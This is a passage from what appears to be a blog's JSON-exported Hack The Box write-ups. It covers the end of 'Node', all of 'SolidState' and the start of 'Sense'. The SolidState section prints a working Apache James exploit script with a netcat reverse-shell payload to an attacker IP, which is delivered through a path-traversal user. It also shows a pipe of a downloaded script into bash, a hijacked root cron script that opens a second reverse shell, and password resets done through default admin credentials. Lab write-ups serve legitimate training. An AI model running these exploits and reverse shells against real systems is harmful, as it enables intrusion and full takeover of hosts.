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\u0026#34; | base64 -d \u0026gt; root.zip   1 2  unzip root.zip password: magicword   Skills Learned  Bypassing user agent filtering Brute forcing JSON payloads Exploiting buffer overflows Bypassing ASLR and NX  ","description":"Node focuses mainly on newer software and poor configurations. The machine starts out seemingly easy, but gets progressively harder as more access is gained. In-depth enumeration is required at several steps to be able to progress further into the machine.","id":13,"section":"posts","tags":["Hackthebox","OSCP","linux","javascript","python","web","vulnerability assessment","security tools","reversing","authentication","nodejs","hydra","binary exploitation","password cracking","suid exploitation","buffer overflow","clear text credentials"],"title":"Hackthebox - Node","uri":"https://hswootan.github.io/en/posts/node/"},{"content":"\r\rEnumeration 1  nmap -sC -sV -vv 10.10.10.51 -oN solidstate_scan   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE= | 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY 25/tcp open smtp syn-ack ttl 63 JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.31 [10.10.14.31]), PIPELINING, ENHANCEDSTATUSCODES 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-title: Home - Solid State Security |_http-server-header: Apache/2.4.25 (Debian) 110/tcp open pop3 syn-ack ttl 63 JAMES pop3d 2.3.2 119/tcp open nntp syn-ack ttl 63 JAMES nntpd (posting ok) Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel   1  nmap -p- -sC -sV 10.10.10.51 -oN solidstate_scan_2   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) |_ 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) 25/tcp open smtp JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello solidstate.htb (10.10.14.31 [10.10.14.31]), PIPELINING, ENHANCEDSTATUSCODES 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-title: Home - Solid State Security |_http-server-header: Apache/2.4.25 (Debian) 110/tcp open pop3 JAMES pop3d 2.3.2 |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) 119/tcp open nntp JAMES nntpd (posting ok) |_sslv2: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) 4555/tcp open rsip? | fingerprint-strings: | GenericLines: | JAMES Remote Administration Tool 2.3.2 | Please enter your login and password | Login id: | Password: | Login failed for |_ Login id:   Directory Enumeration 1  gobuster dir -u http://10.10.10.51/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -n   1 2 3  /images [Size: 311] [--\u0026gt; http://10.10.10.51/images/] /assets [Size: 311] [--\u0026gt; http://10.10.10.51/assets/] /server-status [Size: 299]    Nothing really interesting scanning directories Let’s connect to the strange port running on 4555 Google searched for james default creds and tried root:root  Interacting with the port 4555\n1 2 3 4 5 6  nc 10.10.10.51 4555 root root help    Available commands  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  Welcome root. HELP for a list of commands help Currently implemented commands: help display this help listusers display existing accounts countusers display the number of existing accounts adduser [username] [password] add a new user verify [username] verify if specified user exist deluser [username] delete existing user setpassword [username] [password] sets a user\u0026#39;s password setalias [user] [alias] locally forwards all email for \u0026#39;user\u0026#39; to \u0026#39;alias\u0026#39; showalias [username] shows a user\u0026#39;s current email alias unsetalias [user] unsets an alias for \u0026#39;user\u0026#39; setforwarding [username] [emailaddress] forwards a user\u0026#39;s email to another email address showforwarding [username] shows a user\u0026#39;s current email forwarding unsetforwarding [username] removes a forward user [repositoryname] change to another user repository shutdown kills the current JVM (convenient when James is run as a daemon) quit close connection   1 2 3 4 5 6 7 8  listusers --- Existing accounts 5 user: james user: thomas user: john user: mindy user: mailadmin    Let’s set a password for the listed users  1 2 3 4 5 6 7  setpassword mindy password123 setpassword john password123 setpassword thomas password123 setpassword james password123   POP3 port 110 (Interacting with Telnet)  Interacting with POP3 port 110 Useful article to interact with telnet → https://www.shellhacks.com/retrieve-email-pop3-server-command-line/  Checking User: mindy\n1 2 3 4  telnet 10.10.10.51 110 USER mindy PASS password123   1 2 3 4 5 6  list --- 1 1109 2 836 ---   1 2 3 4 5 6 7 8 9 10 11 12 13 14  retr 1 --- From: mailadmin@localhost Subject: Welcome Dear Mindy, Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you. We are looking forward to you joining our team and your success at Solid State Security. Respectfully, James ---   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  retr 2 --- Return-Path: \u0026lt;mailadmin@localhost\u0026gt; Message-ID: \u0026lt;16744123.2.1503422270399.JavaMail.root@solidstate\u0026gt; MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for \u0026lt;mindy@localhost\u0026gt;; Tue, 22 Aug 2017 13:17:28 -0400 (EDT) Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, JamesReturn-Path: \u0026lt;mailadmin@localhost\u0026gt; Message-ID: \u0026lt;5420213.0.1503422039826.JavaMail.root@solidstate\u0026gt; MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798 for \u0026lt;mindy@localhost\u0026gt;; Tue, 22 Aug 2017 13:13:42 -0400 (EDT) Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT) From: mailadmin@localhost Subject: Welcome Dear Mindy, Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you. We are looking forward to you joining our team and your success at Solid State Security. Respectfully, James ---    In the second email we have a ssh credentials username: mindy pass: P@55W0rd1!2@  Checking User: john\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  telnet 10.10.10.51 110 USER john PASS password123 list +OK 1 743 1 743 retr 1 +OK Message follows Return-Path: \u0026lt;mailadmin@localhost\u0026gt; Message-ID: \u0026lt;9564574.1.1503422198108.JavaMail.root@solidstate\u0026gt; MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: john@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for \u0026lt;john@localhost\u0026gt;; Tue, 22 Aug 2017 13:16:20 -0400 (EDT) Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT) From: mailadmin@localhost Subject: New Hires access John, Can you please restrict mindy\u0026#39;s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts. Thank you in advance. Respectfully, James   Checking user: thomas\n1 2 3 4 5 6 7 8 9 10 11 12  telnet 10.10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is \u0026#39;^]\u0026#39;. USER thomas +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready +OK PASS password123 +OK Welcome thomas list +OK 0 0   Checking user: james\n1 2 3 4 5 6 7 8 9 10 11 12  telnet 10.10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is \u0026#39;^]\u0026#39;. +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready USER james +OK PASS password123 +OK Welcome james list +OK 0 0   SSH\n Let’s ssh to user mindy with the credentials we found mindy | P@55W0rd1!2@  1 2  cat user.txt -\u0026gt; ********************************    We have a restricted shell but we can\u0026rsquo;t cat and get the user flag  Exploitation  Found this exploit → https://www.exploit-db.com/exploits/50347 Using the payload available I named the file 50347.py  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77  #!/usr/bin/python3 import socket import sys import time # credentials to James Remote Administration Tool (Default - root/root) user = \u0026#39;root\u0026#39; pwd = \u0026#39;root\u0026#39; if len(sys.argv) != 4: sys.stderr.write(\u0026#34;[-]Usage: python3 %s\u0026lt;remote ip\u0026gt; \u0026lt;local ip\u0026gt; \u0026lt;local listener port\u0026gt;\\n\u0026#34; % sys.argv[0]) sys.stderr.write(\u0026#34;[-]Example: python3 %s172.16.1.66 172.16.1.139 443\\n\u0026#34; % sys.argv[0]) sys.stderr.write(\u0026#34;[-]Note: The default payload is a basic bash reverse shell - check script for details and other options.\\n\u0026#34;) sys.exit(1) remote_ip = sys.argv[1] local_ip = sys.argv[2] port = sys.argv[3] # Select payload prior to running script - default is a reverse shell executed upon any user logging in (i.e. via SSH) payload = \u0026#39;nc -e /bin/sh 10.10.14.31 1234\u0026#39; # Change to your own ip address and set the port you like #payload = \u0026#39;nc -e /bin/sh \u0026#39; + local_ip + \u0026#39; \u0026#39; + port # basic netcat reverse shell #payload = \u0026#39;echo $USER \u0026amp;\u0026amp; cat /etc/passwd \u0026amp;\u0026amp; ping -c 4 \u0026#39; + local_ip # test remote command execution capabilities and connectivity #payload = \u0026#39;[ \u0026#34;$(id -u)\u0026#34; == \u0026#34;0\u0026#34; ] \u0026amp;\u0026amp; touch /root/proof.txt\u0026#39; # proof of concept exploit on root user login only print (\u0026#34;[+]Payload Selected (see script for more options): \u0026#34;, payload) if \u0026#39;/bin/bash\u0026#39; in payload: print (\u0026#34;[+]Example netcat listener syntax to use after successful execution: nc -lvnp\u0026#34;, port) def recv(s): s.recv(1024) time.sleep(0.2) try: print (\u0026#34;[+]Connecting to James Remote Administration Tool...\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((remote_ip,4555)) # Assumes James Remote Administration Tool is running on Port 4555, change if necessary. s.recv(1024) s.send((user + \u0026#34;\\n\u0026#34;).encode(\u0026#39;utf-8\u0026#39;)) s.recv(1024) s.send((pwd + \u0026#34;\\n\u0026#34;).encode(\u0026#39;utf-8\u0026#39;)) s.recv(1024) print (\u0026#34;[+]Creating user...\u0026#34;) s.send(\u0026#34;adduser ../../../../../../../../etc/bash_completion.d exploit\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) s.recv(1024) s.send(\u0026#34;quit\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) s.close() print (\u0026#34;[+]Connecting to James SMTP server...\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((remote_ip,25)) # Assumes default SMTP port, change if necessary. s.send(\u0026#34;ehlo team@team.pl\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) recv(s) print (\u0026#34;[+]Sending payload...\u0026#34;) s.send(\u0026#34;mail from: \u0026lt;\u0026#39;@team.pl\u0026gt;\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) recv(s) # also try s.send(\u0026#34;rcpt to: \u0026lt;../../../../../../../../etc/bash_completion.d@hostname\u0026gt;\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) if the recipient cannot be found s.send(\u0026#34;rcpt to: \u0026lt;../../../../../../../../etc/bash_completion.d\u0026gt;\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) recv(s) s.send(\u0026#34;data\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) recv(s) s.send(\u0026#34;From: team@team.pl\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) s.send(\u0026#34;\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) s.send(\u0026#34;\u0026#39;\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) s.send((payload + \u0026#34;\\n\u0026#34;).encode(\u0026#39;utf-8\u0026#39;)) s.send(\u0026#34;\\r\\n.\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) recv(s) s.send(\u0026#34;quit\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) recv(s) s.close() print (\u0026#34;[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).\u0026#34;) if \u0026#39;/bin/bash\u0026#39; in payload: print (\u0026#34;[+]Don\u0026#39;t forget to start a listener on port\u0026#34;, port, \u0026#34;before logging in!\u0026#34;) except: print (\u0026#34;Connection failed.\u0026#34;)   1 2 3 4 5 6 7 8  python3 50347.py 10.10.10.51 10.10.14.31 4555 [+]Payload Selected (see script for more options): nc -e /bin/sh 10.10.14.31 1234 [+]Connecting to James Remote Administration Tool... [+]Creating user... [+]Connecting to James SMTP server... [+]Sending payload... [+]Done! Payload will be executed once somebody logs in (i.e. via SSH).    You can also use this payload 35513.py → https://www.exploit-db.com/exploits/35513 Just modify the payload and run  1 2 3 4 5 6 7  python 35513.py 10.10.10.51 [+]Connecting to James Remote Administration Tool... [+]Creating user... [+]Connecting to James SMTP server... [+]Sending payload... [+]Done! Payload will be executed once somebody logs in.    Let’s login again throguh ssh mindy | P@55W0rd1!2@ Make sure to do  1 2 3  nc -lvnp 1234 # Make sure to start listener with the port you specified in the payload ssh mindy@10.10.10.51   Interactive Shell\n1 2 3 4 5 6 7 8 9 10 11  which python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo fg [Press Enter] export TERM=screen   Alternative way to connect mindy with bash shell\n1  ssh mindy@10.10.10.51 bash # we can run regular commands   Privilege Escalation  Further scan with linpeas → https://github.com/carlospolop/PEASS-ng/releases  1 2 3  python3 -m http.server curl http://10.10.14.31:8000/linpeas.sh | bash    In our scan we didn’t find port 631. This might be interesting to look at  1 2 3 4 5 6 7 8 9 10 11 12 13  cd /opt cat tmp.py --- #!/usr/bin/env python import os import sys try: os.system(\u0026#39;rm -r /tmp/* \u0026#39;) except: sys.exit() ---    Check if we have permission to write to tmp.py We can also use → https://github.com/DominicBreuker/pspy to scan the machine to see running processes on linux machines Download the pspy32 (You can determine it by typing [uname -m]) The linux machine’s architecture is i686 which is a 32bit  1 2 3 4 5  wget http://10.10.14.31:8000/pspy32 chmod +x pspy32 ./pspy32    We verified that there is a process going running on root /opt/tmp.py  Fixing the columns in bash terminal\n1 2 3  stty -a stty rows 36 columns 37   1 2 3 4 5 6 7 8  #!/usr/bin/env python import os import sys try: os.system(\u0026#39;nc -e /bin/sh 10.10.14.31 8080\u0026#39;) except: sys.exit()   1  nc -lvnp 8080    We will get the reverse shell in couple seconds  Skills Learned  Exploiting Apache James Enumerating POP servers Chaining vulnerabilities Exploiting world-writable files  ","description":"SolidState is a medium difficulty machine that requires chaining of multiple attack vectors in order to get a privileged shell. As a note, in some cases the exploit may fail to trigger more than once and a machine reset is required.","id":14,"section":"posts","tags":["OSCP","linux","apache james","pop","web","vulnerability assessment","outdated software","python","default credentials","weak permissions"],"title":"Hackthebox - Solidstate","uri":"https://hswootan.github.io/en/posts/solidstate/"},{"content":"\r\rEnumeration 1  nmap -sC -sV -vv 10.10.10.60 -oN sense   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 lighttpd 1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: lighttpd/1.4.35 443/tcp open ssl/http syn-ack ttl 63 lighttpd 1.4.35 | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/emailAddress=Email Address/organizationalUnitName=Organizational Unit Name (eg, section)/localityName=Somecity | Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/emailAddress=Email Address/organizationalUnitName=Organizational Unit Name (eg, section)/localityName=Somecity | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2017-10-14T19:21:35 | Not valid after: 2023-04-06T19:21:35 | MD5: 65f8 b00f 57d2 3468 2c52 0f44 8110 c622 | SHA-1: 4f7c 9a75 cb7f 70d3 8087 08cb 8c27 20dc 05f1 bb02 | -----BEGIN CERTIFICATE----- | MIIEKDCCA5GgAwIBAgIJALChaIpiwz41MA0GCSqGSIb3DQEBCwUAMIG/MQswCQYD | VQQGEwJVUzESMBAGA1UECBMJU29tZXdoZXJlMREwDwYDVQQHEwhTb21lY2l0eTEU | MBIGA1UEChMLQ29tcGFueU5hbWUxLzAtBgNVBAsTJk9yZ2FuaXphdGlvbmFsIFVu | aXQgTmFtZSAoZWcsIHNlY3Rpb24pMSQwIgYDVQQDExtDb21tb24gTmFtZSAoZWcs | IFlPVVIgbmFtZSkxHDAaBgkqhkiG9w0BCQEWDUVtYWlsIEFkZHJlc3MwHhcNMTcx | MDE0MTkyMTM1WhcNMjMwNDA2MTkyMTM1WjCBvzELMAkGA1UEBhMCVVMxEjAQBgNV | BAgTCVNvbWV3aGVyZTERMA8GA1UEBxMIU29tZWNpdHkxFDASBgNVBAoTC0NvbXBh | bnlOYW1lMS8wLQYDVQQLEyZPcmdhbml6YXRpb25hbCBVbml0IE5hbWUgKGVnLCBz | ZWN0aW9uKTEkMCIGA1UEAxMbQ29tbW9uIE5hbWUgKGVnLCBZT1VSIG5hbWUpMRww | GgYJKoZIhvcNAQkBFg1FbWFpbCBBZGRyZXNzMIGfMA0GCSqGSIb3DQEBAQUAA4GN | ADCBiQKBgQC/sWU6By08lGbvttAfx47SWksgA7FavNrEoW9IRp0W/RF9Fp5BQesL | L3FMJ0MHyGcfRhnL5VwDCL0E+1Y05az8PY8kUmjvxSvxQCLn6Mh3nTZkiAJ8vpB0 | WAnjltrTCEsv7Dnz2OofkpqaUnoNGfO3uKWPvRXl9OlSe/BcDStffQIDAQABo4IB | KDCCASQwHQYDVR0OBBYEFDK5DS/hTsi9SHxT749Od/p3Lq05MIH0BgNVHSMEgeww | gemAFDK5DS/hTsi9SHxT749Od/p3Lq05oYHFpIHCMIG/MQswCQYDVQQGEwJVUzES | MBAGA1UECBMJU29tZXdoZXJlMREwDwYDVQQHEwhTb21lY2l0eTEUMBIGA1UEChML | Q29tcGFueU5hbWUxLzAtBgNVBAsTJk9yZ2FuaXphdGlvbmFsIFVuaXQgTmFtZSAo | ZWcsIHNlY3Rpb24pMSQwIgYDVQQDExtDb21tb24gTmFtZSAoZWcsIFlPVVIgbmFt | ZSkxHDAaBgkqhkiG9w0BCQEWDUVtYWlsIEFkZHJlc3OCCQCwoWiKYsM+NTAMBgNV | HRMEBTADAQH/MA0GCSqGSIb3DQEBCwUAA4GBAHNn+1AX2qwJ9zhgN3I4ES1Vq84l | n6p7OoBefxcf31Pn3VDnbvJJFFcZdplDxbIWh5lyjpTHRJQyHECtEMW677rFXJAl | /cEYWHDndn9Gwaxn7JyffK5lUAPMPEDtudQb3cxrevP/iFZwefi2d5p3jFkDCcGI | +Y0tZRIRzHWgQHa/ |_-----END CERTIFICATE----- |_http-title: Login |_http-favicon: Unknown favicon MD5: 082559A7867CF27ACAB7E9867A8B320F | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 